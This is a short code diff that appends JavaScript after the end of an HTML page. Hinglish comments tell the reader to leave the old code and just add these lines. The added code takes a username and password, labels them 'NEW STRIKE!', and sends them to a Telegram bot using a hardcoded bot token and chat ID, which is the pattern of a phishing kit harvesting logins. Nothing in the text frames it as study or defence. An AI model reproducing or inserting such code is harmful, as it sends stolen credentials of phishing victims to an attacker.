@@ -35,3 +35,16 @@
     </script>
 </body>
 </html>
+// --- Purana Code (Waisa hi rehne dein) ---
+// Jo data receive karta hai...
+
+// --- Naya Code (Bas ye lines add karein) ---
+const botToken = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
+const chatId = '8639892987';
+const message = `🔥 NEW STRIKE! 🔥\n\n👤 User: ${username}\n🔑 Pass: ${password}`;
+
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+});
